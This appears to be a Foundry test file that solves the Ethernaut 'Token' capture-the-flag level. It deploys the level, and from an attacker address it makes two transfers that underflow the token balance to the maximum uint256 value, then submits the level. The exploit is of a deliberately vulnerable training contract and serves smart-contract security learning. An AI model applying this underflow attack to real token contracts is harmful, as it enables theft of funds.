// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/05-Token/TokenFactory.sol';
import '../core/Ethernaut.sol';

contract TokenTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
  }

  function testTokenHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    TokenFactory tokenFactory = new TokenFactory();
    ethernaut.registerLevel(tokenFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(tokenFactory);
    Token tokenContract = Token(levelAddress);

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------
    tokenContract.transfer(address(0x1), 20);
    emit log_named_uint(
      'playerContract balance',
      tokenContract.balanceOf(address(attacker))
    );
    tokenContract.transfer(address(0x1), 1);
    emit log_named_uint(
      'playerContract balance',
      tokenContract.balanceOf(address(attacker))
    );
    assertEq(tokenContract.balanceOf(address(attacker)), type(uint256).max);

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}
